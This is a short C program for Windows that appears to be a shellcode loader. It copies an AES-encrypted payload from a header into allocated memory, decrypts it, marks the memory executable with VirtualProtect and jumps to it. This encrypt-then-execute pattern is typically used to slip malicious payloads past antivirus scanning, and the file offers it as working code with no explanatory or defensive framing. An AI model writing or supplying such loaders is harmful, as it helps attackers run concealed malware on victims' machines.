#include <Windows.h>
#include "module.h"
#include "aes.h"

typedef VOID PAYLOAD(VOID);

INT main(VOID) {
	struct AES_ctx ctx;
	VOID* payload_buff = NULL;
	DWORD old_protection;

	payload_buff = VirtualAlloc(
		NULL,
		sizeof(encrypted_payload),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	CopyMemory(payload_buff, encrypted_payload, sizeof(encrypted_payload));

	AES_init_ctx_iv(&ctx, key_bytes, iv_bytes);

	AES_CBC_decrypt_buffer(&ctx, payload_buff, sizeof(encrypted_payload));

	VirtualProtect(payload_buff, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &old_protection);

	PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

	fn_payload();

	return 0;
}